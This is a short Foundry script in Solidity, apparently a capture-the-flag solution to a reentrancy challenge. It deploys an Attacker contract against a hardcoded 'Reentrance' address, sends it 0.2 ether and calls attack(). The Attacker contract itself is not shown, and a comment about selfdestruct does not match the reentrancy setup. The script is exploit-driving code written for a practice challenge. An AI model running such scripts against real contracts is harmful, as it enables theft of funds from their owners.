// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    function setUp() public {}

    //solveed by using the selfdestruct() to send ether to another contract
    function run() public {
        vm.startBroadcast();
        Reentrance reentranceContract = Reentrance(0x74fFfbc41d7595a0d6C1187B969e8cd9B18458Ea);
        Attacker attacker = new Attacker(reentranceContract);

       (bool success, ) = payable(address(attacker)).call{value: 0.2 ether}("");
       require(success == true, 'eth send failed');

        attacker.attack();

        vm.stopBroadcast();
    }
}
